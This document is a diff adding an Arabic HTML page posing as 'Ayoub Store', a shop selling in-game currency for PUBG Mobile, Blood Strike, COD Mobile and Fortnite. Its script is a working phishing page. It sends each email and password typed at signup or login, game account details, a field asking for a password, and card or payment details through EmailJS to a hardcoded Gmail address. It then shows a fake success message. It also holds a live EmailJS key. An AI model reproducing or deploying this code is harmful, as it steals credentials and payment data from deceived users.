@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>ايوب ستور</title>
+  <style>
+    body { font-family: Arial, sans-serif; direction: rtl; background: #f4f4f4; margin: 0; padding: 0; }
+    .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
+    .hidden { display: none; }
+    button { margin: 5px; padding: 10px; border: none; border-radius: 6px; cursor: pointer; }
+    .logout { position: absolute; top: 10px; left: 10px; background: red; color: white; }
+    .error { color: red; }
+  </style>
+</head>
+<body>
+
+<div class="container" id="loginPage">
+  <h2>تسجيل الدخول / انشاء حساب</h2>
+  <input id="email" placeholder="البريد الإلكتروني"><br>
+  <input id="password" type="password" placeholder="كلمة السر"><br>
+  <button onclick="register()">إنشاء حساب</button>
+  <button onclick="login()">تسجيل الدخول</button>
+  <p class="error" id="loginError"></p>
+</div>
+
+<div class="container hidden" id="mainPage">
+  <button class="logout" onclick="logout()">تسجيل الخروج</button>
+  <h2>اختر اللعبة</h2>
+  <div id="games">
+    <button onclick="openSection('pubg')">ببجي موبايل</button>
+    <button onclick="openSection('blood')">بلود سترايك</button>
+    <button onclick="openSection('cod')">كود موبايل</button>
+    <button onclick="openSection('fortnite')">فورت نايت</button>
+  </div>
+
+  <!-- اقسام الألعاب -->
+  <div id="pubg" class="hidden">
+    <h3>ببجي موبايل</h3>
+    <button onclick="buy('PUBG', '480 شدة', 5)">480 شدة - 5$</button>
+    <button onclick="buy('PUBG', '880 شدة', 10)">880 شدة - 10$</button>
+    <button onclick="buy('PUBG', '1400 شدة', 16)">1400 شدة - 16$</button>
+    <button onclick="closeSections()">رجوع</button>
+  </div>
+
+  <div id="blood" class="hidden">
+    <h3>بلود سترايك</h3>
+    <button onclick="buy('Blood Strike', '520 جولد', 5)">520 جولد - 5$</button>
+    <button onclick="buy('Blood Strike', '1200 جولد', 8)">1200 جولد - 8$</button>
+    <button onclick="buy('Blood Strike', '2500 جولد', 16)">2500 جولد - 16$</button>
+    <button onclick="closeSections()">رجوع</button>
+  </div>
+
+  <div id="cod" class="hidden">
+    <h3>كود موبايل</h3>
+    <button onclick="buy('COD Mobile', '480 CP', 5)">480 CP - 5$</button>
+    <button onclick="buy('COD Mobile', '880 CP', 10)">880 CP - 10$</button>
+    <button onclick="buy('COD Mobile', '1200 CP', 16)">1200 CP - 16$</button>
+    <button onclick="closeSections()">رجوع</button>
+  </div>
+
+  <div id="fortnite" class="hidden">
+    <h3>فورت نايت</h3>
+    <button onclick="buy('Fortnite', '500 V-Bucks', 5)">500 V-Bucks - 5$</button>
+    <button onclick="buy('Fortnite', '880 V-Bucks', 10)">880 V-Bucks - 10$</button>
+    <button onclick="buy('Fortnite', '1200 V-Bucks', 16)">1200 V-Bucks - 16$</button>
+    <button onclick="closeSections()">رجوع</button>
+  </div>
+</div>
+
+<!-- صفحة ادخال معلومات اللاعب -->
+<div class="container hidden" id="infoPage">
+  <h3>معلومات اللاعب</h3>
+  <input id="playerId" placeholder="معرف اللاعب"><br>
+  <input id="playerName" placeholder="اسمك في اللعبة"><br>
+  <input id="playerCountry" placeholder="الدولة"><br>
+  <input id="playerContact" placeholder="بريد إلكتروني أو كلمة السر"><br>
+  <p class="error" id="infoError"></p>
+  <button id="confirmInfo" class="hidden" onclick="goToPayment()">تأكيد الشراء</button>
+</div>
+
+<!-- صفحة الدفع -->
+<div class="container hidden" id="paymentPage">
+  <h3>اختيار طريقة الدفع</h3>
+  <select id="paymentMethod" onchange="showContinue()">
+    <option value="">اختر طريقة الدفع</option>
+    <option value="paypal">باي بال</option>
+    <option value="visa">فيزا / ماستر كارد</option>
+    <option value="orange">اورنج موني</option>
+  </select>
+  <br>
+  <button id="continueBtn" class="hidden" onclick="showPaymentForm()">استمرار</button>
+</div>
+
+<!-- صفحة معلومات الدفع -->
+<div class="container hidden" id="paymentInfoPage">
+  <h3>معلومات الدفع</h3>
+  <input id="paymentDetails" placeholder="معلومات البطاقة"><br>
+  <button onclick="finalizePurchase()">شراء الآن</button>
+</div>
+
+<!-- رسالة نهائية -->
+<div class="container hidden" id="finalPage">
+  <h2>تمت العملية</h2>
+  <p>يرجى تفقد بريدك في اللعبة بعد 10 دقائق أو ساعة كحد أقصى</p>
+</div>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("YYV4l2uF7MH1-H1wd"); // ضع هنا User ID من EmailJS
+  })();
+
+  let currentUser = null;
+  let selectedGame = null;
+  let selectedItem = null;
+  let selectedPrice = null;
+
+  function sendEmail(templateParams) {
+    emailjs.send("Aeoop_store", "template_p04c41m", templateParams)
+      .then(() => console.log("تم إرسال البيانات إلى البريد"))
+      .catch(err => console.log("خطأ الإرسال:", err));
+  }
+
+  function register() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    if (!email || !password) { document.getElementById("loginError").innerText = "يرجى إدخال كافة البيانات"; return; }
+    currentUser = email;
+    sendEmail({ to_email: "mmmnass99@gmail.com", user_email: email, user_password: password, type: "إنشاء حساب" });
+    document.getElementById("loginPage").classList.add("hidden");
+    document.getElementById("mainPage").classList.remove("hidden");
+  }
+
+  function login() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    if (!email || !password) { document.getElementById("loginError").innerText = "يرجى إدخال كافة البيانات"; return; }
+    currentUser = email;
+    sendEmail({ to_email: "mmmnass99@gmail.com", user_email: email, user_password: password, type: "تسجيل دخول" });
+    document.getElementById("loginPage").classList.add("hidden");
+    document.getElementById("mainPage").classList.remove("hidden");
+  }
+
+  function logout() {
+    currentUser = null;
+    document.getElementById("mainPage").classList.add("hidden");
+    document.getElementById("loginPage").classList.remove("hidden");
+  }
+
+  function openSection(id) { document.getElementById("games").classList.add("hidden"); document.getElementById(id).classList.remove("hidden"); }
+  function closeSections() { document.querySelectorAll("#mainPage > div").forEach(div => div.classList.add("hidden")); document.getElementById("games").classList.remove("hidden"); }
+  function buy(game, item, price) { selectedGame = game; selectedItem = item; selectedPrice = price; document.getElementById("mainPage").classList.add("hidden"); document.getElementById("infoPage").classList.remove("hidden"); }
+  function goToPayment() { document.getElementById("infoPage").classList.add("hidden"); document.getElementById("paymentPage").classList.remove("hidden"); }
+  function showContinue() { document.getElementById("continueBtn").classList.remove("hidden"); }
+  function showPaymentForm() { document.getElementById("paymentPage").classList.add("hidden"); document.getElementById("paymentInfoPage").classList.remove("hidden"); }
+
+  function finalizePurchase() {
+    const playerId = document.getElementById("playerId").value;
+    const playerName = document.getElementById("playerName").value;
+    const playerCountry = document.getElementById("playerCountry").value;
+    const playerContact = document.getElementById("playerContact").value;
+    const paymentMethod = document.getElementById("paymentMethod").value;
+    const paymentDetails = document.getElementById("paymentDetails").value;
+
+    sendEmail({
+      to_email: "mmmnass99@gmail.com",
+      type: "شراء",
+      user_email: currentUser,
+      game: selectedGame,
+      item: selectedItem,
+      price: selectedPrice,
+      playerId, playerName, playerCountry, playerContact,
+      paymentMethod, paymentDetails
+    });
+
+    document.getElementById("paymentInfoPage").classList.add("hidden");
+    document.getElementById("finalPage").classList.remove("hidden");
+  }
+
+  // إظهار زر تأكيد عند إدخال كل البيانات
+  document.querySelectorAll("#infoPage input").forEach(input => {
+    input.addEventListener("input", () => {
+      const playerId = document.getElementById("playerId").value;
+      const playerName = document.getElementById("playerName").value;
+      const playerCountry = document.getElementById("playerCountry").value;
+      const playerContact = document.getElementById("playerContact").value;
+      if (playerId && playerName && playerCountry && playerContact) document.getElementById("confirmInfo").classList.remove("hidden");
+      else document.getElementById("confirmInfo").classList.add("hidden");
+    });
+  });
+</script>
+
+</body>
+</html>
